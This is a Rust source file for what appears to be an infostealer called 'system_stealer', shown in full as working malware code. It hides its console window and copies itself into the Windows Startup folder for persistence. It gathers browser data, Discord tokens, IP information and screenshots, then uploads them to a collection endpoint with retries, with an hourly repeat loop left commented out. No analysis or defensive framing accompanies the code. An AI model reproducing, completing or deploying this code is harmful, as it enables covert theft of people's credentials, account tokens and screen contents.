mod browser;
mod discord;
mod ip;
mod screenshot;

use reqwest::Client;
use screenshots::image::ImageFormat;
use serde_json::json;
use std::env;
use std::fs;
use std::io::Cursor;
use std::path::PathBuf;
use tokio;

use windows::Win32::Foundation::HWND;
use windows::Win32::System::Console::GetConsoleWindow;
use windows::Win32::UI::WindowsAndMessaging::{SW_HIDE, ShowWindow};

fn hide_console_window() {
    let hwnd: HWND = unsafe { GetConsoleWindow() };
    if hwnd != HWND(std::ptr::null_mut()) {
        unsafe {
            let _ = ShowWindow(hwnd, SW_HIDE);
        }
    }
}

fn save_itself() {
    let current_exe = env::current_exe().ok();
    let current_user = env::var("USERNAME").ok();

    if current_exe.is_none() || current_user.is_none() {
        return;
    }
    let current_exe = current_exe.unwrap();
    let current_user = current_user.unwrap();

    let mut path = PathBuf::from(format!(
        r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
        current_user
    ));

    if !path.exists() {
        return;
    }

    path.push("system_stealer.exe");

    if !path.exists() {
        fs::copy(&current_exe, &path).ok();
    }
}

struct StolenData {
    ip_info: String,
    browser_data: String,
    discord_tokens: String,
    screenshots: Vec<Vec<u8>>,
}

async fn collect_data() -> Option<StolenData> {
    let info_future = ip::get_ip_info();
    let browser_data = browser::steal_browser_data();
    let discord_tokens = discord::find_tokens();
    let screenshot = screenshot::take_screenshot();
    
    let info = info_future.await;

    let info_json = serde_json::to_string(&info).ok()?;
    let browser_json = serde_json::to_string(&browser_data).ok()?;
    let tokens_json = serde_json::to_string(&discord_tokens).ok()?;

    let screenshot_data = screenshot
        .map(|images| {
            images
                .into_iter()
                .filter_map(|img| {
                    let mut buf = Cursor::new(Vec::new());
                    img.write_to(&mut buf, ImageFormat::Png).ok()?;
                    Some(buf.into_inner())
                })
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();

    Some(StolenData {
        ip_info: info_json,
        browser_data: browser_json,
        discord_tokens: tokens_json,
        screenshots: screenshot_data,
    })
}

async fn send_data(client: &Client, data: StolenData, endpoint: &str) -> bool {
    const MAX_RETRIES: u32 = 3;
    const TIMEOUT_SECS: u64 = 30;

    for attempt in 1..=MAX_RETRIES {
        let result = tokio::time::timeout(
            std::time::Duration::from_secs(TIMEOUT_SECS),
            client
                .post(endpoint)
                .json(&json!({
                    "ip_info": data.ip_info,
                    "browser_data": data.browser_data,
                    "discord_tokens": data.discord_tokens,
                    "screenshots": data.screenshots,
                }))
                .send(),
        )
        .await;

        match result {
            Ok(Ok(response)) if response.status().is_success() => return true,
            _ => {
                if attempt < MAX_RETRIES {
                    tokio::time::sleep(std::time::Duration::from_secs(2_u64.pow(attempt))).await;
                }
            }
        }
    }

    false
}

#[tokio::main]
async fn main() {
    hide_console_window();
    save_itself();

    const ENDPOINT: &str = "http://127.0.0.1:5000/upload";
    const INTERVAL_HOURS: u64 = 1;

    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .unwrap_or_else(|_| Client::new());

    // Uncomment the loop below to enable periodic data collection and sending
    // loop {
        if let Some(data) = collect_data().await {
            send_data(&client, data, ENDPOINT).await;
        }

        
        // tokio::time::sleep(std::time::Duration::from_secs(INTERVAL_HOURS * 3600)).await;
    // }
}
